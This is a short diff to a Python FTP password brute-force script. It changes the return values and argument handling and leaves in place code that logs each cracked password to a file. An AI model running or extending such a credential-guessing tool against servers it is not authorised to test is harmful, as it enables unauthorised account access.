@@ -44,12 +44,12 @@ def ftp_bruteforce(server, user, password_list):
                     tries += 1
                     # Log success to file
                     log_success(server, user, password, tries)
-                    return True
+                    return tries
             except ftplib.error_perm as e:
                 print(f'[-] FTP error: {e}')
             except Exception as e:
                 print(f'[-] Error: {e}')
-    return False
+    return None
 
 def log_success(server, user, password, tries):
     """Log successful login to file"""
@@ -64,13 +64,17 @@ def usage():
 
 def main(*args, **kwargs):
     try:
-        exit_code = ftp_bruteforce(*args)
-        if exit_code:
+        server, user, password_list = sys.argv[1:]
+        result = ftp_bruteforce(server, user, password_list)
+        
+        if result is not None:
             sys.exit(0)
-        sys.exit(1)
+        
     except Exception as e:
         print(f"[-] There was a problem executing the script")
         print(usage())
+    
+    sys.exit(1)
 
 
 if __name__ == '__main__':
